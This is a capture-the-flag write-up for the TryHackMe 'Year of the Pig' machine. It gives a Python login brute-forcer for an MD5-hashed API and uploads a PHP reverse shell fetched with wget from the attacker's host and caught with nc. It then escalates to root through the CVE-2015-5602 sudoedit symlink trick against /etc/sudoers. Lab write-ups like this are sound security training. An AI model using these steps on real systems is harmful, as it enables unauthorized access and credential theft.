# [Year of the pig](https://tryhackme.com/room/yearofthepig)
## ENUMERATION
Nmap :
```
nmap -sC -sV -p- 10.10.9.235  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 13:10 IST
Nmap scan report for 10.10.9.235
Host is up (0.057s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's start with the webserver.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20131321.png)

Use gobuster for directory bruteforcing:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20132146.png)

This reveals the admin directory which yields us this as `/login.php`:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20132225.png)

# Web Login:
The page is sending an AJAX request to `/api/login` using JSON format for the user input. Also , the password value is MD5 hash value of the string.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20132929.png)

For wrong credentials the following message appears:<br>
`Remember that passwords should be a memorable word, followed by two numbers and a special character`<br>
Take a note of that.<br>
Let's attempt to bruteforce this login now.
We need a custom wordlist as ensured by the password policy. Scanning the page for 'memorable' words gives us this:
 ```
Marco
marco
plane
planes
airplane
airplanes
airforce
flying
Savoia
savoia
Macchi
macchi
Curtiss
curtiss
milan
Milan
mechanic
maintenance
Italian
italian
Agility
agility
```
You can use [CeWL](https://digi.ninja/projects/cewl.php) for this.<br>
Adding a custom rule to `/etc/john/john.conf`. This will fulfill the password policy required.
```
[List.Rules:yop]
Az"[0-9][0-9][!#$%&(),*=/?]"
```
But the passwords are MD5-Hashed first before being sent to the login. Use this python program to hash the passwords and use them to bruteforce the login:
```
#!/usr/bin/python3
import requests
import sys
import json
import hashlib

payload= {"username":sys.argv[2],"password":"test"}

i = 0
for line in sys.stdin:
    payload["password"] = hashlib.md5(line.rstrip().encode('utf-8')).hexdigest()
    r = requests.post(sys.argv[1]+"/api/login",data=json.dumps(payload))
    json_data = json.loads(r.content)
    i = i +1
    if i % 10 == 0:
        print(str(i),end="\r")
    if json_data["Response"] != "Error":
        print (line)
        break
```
 Got this from [auth.py](https://gist.github.com/j11b0/c5101a9d32be96ff73fa4a72c0705290#file-auth-py)<br>
 This takes a while. Thankfully the password doesn't seem to reset with every reboot.

 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20153418.png)

Going forward we see:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20153539.png)

Now this is a complete rabbit hole. The commands section only responds to some commands like `whoami`which tells us we are `www-data` and `id`.

## FOOTHOLD
SSH as marco using the same password and you get the first flag immediately.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20153840.png)

Looking in the `/var/www` directory to find some hints of what to do with the webserver we find that marco can edit any file here except `admin.db`.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20154125.png)

To read `admin.db` we need to be www-data. So, let’s use our edit access to upload the PentestMonkey PHP reverse shell (located by default on Kali at `/usr/share/webshells/php/php-reverse-shell.php`) — making sure to change the IP and port number. <br>Using wget:
```
root@kali:/usr/share/webshells/php# python3 -m http.server
marco@year-of-the-pig:/var/www/html/admin$ wget YOUR-IP:8000/php-reverse-shell.php
```
Start a listener with `nc -lvnp <chosen-port>` then activate the shell by going to `http://<machine-ip>/php-reverse-shell.php`
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20185358.png)

We can't read the databse in a non-interactive shell , so to upgrade use :<br>
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20190238.png)

We got the password hashes of user curtis.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20190410.png)

`su curtis` and you'll get the 2nd flag in his home directory.

## PRIVILEGE ESCALATION
Checking `sudo -l` we see that Curtis can execute sudoedit as sudo, against some files in /var/www/html.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20190838.png)

Checking ExploitDB for sudoedit exploit gives us [this](https://www.exploit-db.com/exploits/37710).<br>
Checking sudo version confirms we are to use the CVE-2015-5602 exploit.
```
curtis@year-of-the-pig:~$ sudo --version
Sudo version 1.8.13
Sudoers policy plugin version 1.8.13
Sudoers file grammar version 44
Sudoers I/O plugin version 1.8.13
```
In this version of sudo , sudoedit does not check the full path if a wildcard is used twice (e.g. `/html/*/*/config.php`), allowing a malicious user to replace the `config.php` real file with a symbolic link to a different location.<br>
Marco being part of the `web-developers` can create such a path.<br>
Now symlink this to `/etc/sudoers` file so we may give curtis sudo access. You can use this with the `/etc/passwd` file to add your own password.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20194036.png)

Back to Curtis : `sudoedit /var/www/html/dir1/dir2/config.php`
This did not work with sudo for some reason.<br>
Add curtis to the file :
```
## User Privilege Specification
##
root ALL=(ALL) ALL
curtis ALL=(ALL) ALL
## Uncomment to allow members of group wheel to execute any command
```
Now you can use su to elevate your privileges.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20The%20Pig/images/Screenshot%202023-07-12%20194118.png)


